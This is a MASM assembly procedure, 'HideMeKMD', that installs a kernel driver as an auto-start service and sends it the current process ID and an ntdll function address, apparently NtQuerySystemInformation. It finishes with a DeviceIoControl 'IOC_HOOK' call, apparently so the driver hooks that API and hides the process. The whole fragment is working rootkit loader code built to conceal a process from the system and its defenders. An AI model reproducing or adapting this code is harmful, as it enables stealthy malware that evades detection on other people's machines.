.code

HideMeKMD proc
LOCAL dwcOut:DWORD
LOCAL buff:DWORD
LOCAL retval:DWORD
;----------------------------------------- Installation of the service; must have the Admin rights.
    mov retval, 0
;----------------------------------------- Begin by querying an access to the service manager database, for a CreateService access
  ;  int 3
    invoke GetSystemDirectory,addr pDir,sizeof pDir
    invoke lstrcat,addr pDir, addr Slash
    invoke lstrcat,addr pDir, addr ServPath
    invoke OpenSCManager,0,0,SC_MANAGER_CREATE_SERVICE
    .if eax == 0
        invoke OpenSCManager,0,0,SC_MANAGER_CONNECT             ; without admin rights
        .if eax == 0
            ret
        .else
            mov scm, eax
            jmp @F
        .endif
    .else
        mov scm, eax
        invoke CreateService,eax,addr ServiceName,addr ServiceName,SERVICE_ALL_ACCESS,SERVICE_KERNEL_DRIVER,SERVICE_AUTO_START,SERVICE_ERROR_NORMAL,addr pDir,0,0,0,0,0
        .if eax == 0
            invoke GetLastError
            .if eax == ERROR_SERVICE_EXISTS           ; service yet installed ?
                invoke OpenService,scm,addr ServiceName,GENERIC_EXECUTE                 ; obtain an handle by opening it
                .if eax == 0
                    jmp @@error
                .endif
            .else
                jmp @@error
            .endif
        .endif
        mov sHnd, eax
        invoke StartService,sHnd,0,0            ;  starts the service now
        .if eax == 0
            invoke GetLastError
            .if eax != ERROR_SERVICE_ALREADY_RUNNING
                invoke CloseServiceHandle, sHnd
    	        jmp @@error
    	    .endif
    	.endif
@@:
    	invoke CreateFileA,addr szDrvSym,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0 ;  or GENERIC_WRITE
        mov hDrv, eax
        inc eax
        .if eax != 0
            invoke LoadLibraryA,addr szNTDll
    	    invoke GetProcAddress,eax,addr szNQSI
    	    .if eax == 0
    	        invoke CloseHandle, hDrv
    	        invoke CloseServiceHandle, sHnd
    	        jmp @@error
            .endif
    	    mov buff, eax
    	    invoke DeviceIoControl,hDrv,IOC_GETAPIID,addr buff,4,0,0,addr dwcOut,0
            invoke GetCurrentProcessId
            mov myPID, eax
    	    push eax
    	    pop buff
    	    invoke DeviceIoControl,hDrv,IOC_GETCURPID,addr buff,4,0,0,addr dwcOut,0
    	    invoke DeviceIoControl,hDrv,IOC_HOOK,0,0,0,0,addr dwcOut,0                  ; this Rul3zzz !
    	    invoke CloseHandle, hDrv
            invoke CloseServiceHandle, sHnd
            invoke CloseServiceHandle,scm
    	    mov eax, 1
    	    ret
    	.else
    	    invoke CloseHandle, hDrv
    	    invoke CloseServiceHandle, sHnd 
@@error:
            invoke CloseServiceHandle,scm
            mov eax, 0
            ret
    	.endif
    .endif
HideMeKMD endp

